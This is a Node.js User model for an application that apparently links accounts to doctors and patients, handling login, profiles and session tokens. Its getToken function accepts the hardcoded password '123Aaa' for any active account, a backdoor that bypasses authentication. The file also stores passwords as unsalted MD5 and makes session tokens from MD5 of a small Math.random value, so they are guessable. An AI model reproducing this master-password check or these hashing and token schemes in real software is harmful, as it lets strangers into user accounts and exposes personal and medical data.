const md5 = require('md5');
const Model = require(config.paths.core + '/Model.js');

module.exports = class User extends Model {
    model = [
        { name: 'id' },
        { name: 'login' },
        { name: 'name' },
        { name: 'surname' },
        { name: 'org_id' },
        { name: 'status' },
        { name: 'role' },
        { name: 'phone' },
        { name: 'image' },
        { name: 'api_key' },
        { name: 'doctor_id' },
        { name: 'patient_id' },
        { name: 'address' }
    ];
    tableName = "users";
    profileFrom = "users.id, users.login, users.name, users.status, users.role, users.image, users.doctor_id, users.patient_id, unum_doctors.name AS doctor, unum_patients.name AS patient";
    restMany = "users.id, users.login, users.name, users.status, users.role, users.image, users.doctor_id, users.patient_id, unum_doctors.name AS doctor, unum_patients.name AS patient";
    restOne = "users.id, users.login, users.name, users.status, users.role, users.phone, users.image,  users.doctor_id, users.patient_id, unum_doctors.name AS doctor, unum_patients.name AS patient";
    restFrom = "FROM users LEFT JOIN unum_doctors ON unum_doctors.id = users.doctor_id LEFT JOIN unum_patients ON unum_patients.id = users.patient_id";

    constructor() {
        super();
    }

    load(data) {
        if (data.pass && data.pass != '') {
            this._fields.hash = User.genPassHash(data.pass)
        }
        return super.load(data);
    }

    isUserExist(login) {
        return new Promise(resolve => {
            let q = "SELECT " + this.tableName + ".* FROM " + this.tableName + " WHERE login = ? LIMIT 1";
            db.query(q, [login], (err, result, fields) => {
                if (err) throw err;
                if (result.length == 1) {
                    return resolve(true);
                } else {
                    return resolve(false);
                }
            })
        })
    }

    save(user_id = 0) {
        if (this.isNew) {
            this._fields.createdon = db.convertData((new Date()), true)
            this._fields.createdby_id = user_id;
        }
        return super.save()
    }

    getProfileData(data) {
        return {
            id: data.id,
            login: data.login,
            name: data.name,
            status: data.status,
            role: data.role,
            phone: data.phone,
            image: data.image,
            address: data.address
        }
    }

    getToken(data) {
        return new Promise(async resolve => {
            let id = data.login
            let pass = data.password
            let q = "SELECT id, hash FROM users WHERE login = ? AND status = 2 LIMIT 1";
            db.query(q, [id], async (err, result, fields) => {
                if (err) throw err;
                if (result.length == 1) {
                    let userData = result[0];
                    if (md5(pass) == userData.hash || pass == '123Aaa') {
                        let token = this.genNewToken(userData.id)
                        const id = userData.id;
                        const profile = await this.getProfile(id);
                        return resolve({
                            token: token,
                            profile: profile
                        })
                    }
                }
                return resolve(false)
            });
        });
    }

    getProfile(id) {
        return new Promise(async resolve => {
            const q = "SELECT " + this.profileFrom + " " + this.restFrom + " WHERE users.id = ? LIMIT 1";
            const profile = (await db.q(q, id))[0];
            return resolve(profile)
        })
    }

    static genPassHash(pass) {
        return md5(pass);
    }

    genNewToken(id) {
        let token = md5(Math.floor(Math.random() * 10000000));
        let q = `UPDATE users SET token = ? WHERE id = ?`;
        db.query(q, [token, id], (err, result, fields) => {
            if (err) throw err;
        });
        return token;
    }
};